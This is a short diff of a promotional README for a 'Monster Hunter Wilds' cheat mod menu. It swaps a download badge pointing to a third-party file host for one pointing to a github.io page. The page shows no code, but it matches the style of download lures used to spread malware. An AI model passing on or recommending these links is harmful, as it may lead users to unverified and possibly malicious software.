@@ -2,7 +2,7 @@
 
 The **Monster Hunter Wilds Mod Menu** is an essential tool for players who want to **customize** and **enhance** their gameplay experience. With this menu, you can **unlock weapons**, **boost stats**, and access a variety of **cheats** to tailor the game to your preferences. Whether you’re looking to **modify game mechanics**, **unlock new features**, or simply make the gameplay easier, the **Mod Menu** provides an intuitive interface that makes customization simple and effective. Ideal for players who want to explore all that **Monster Hunter Wilds** has to offer without the grind.
 
-[![Download MHW Mod Menu](https://img.shields.io/badge/Download-MHWmodmenu%20-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download MHW Mod Menu](https://img.shields.io/badge/Download-MHWmodmenu%20-blueviolet)](https://monster-hunter-wilds-mod-menu.github.io/.github/)
 
 ⚡ **Key Features:**
 
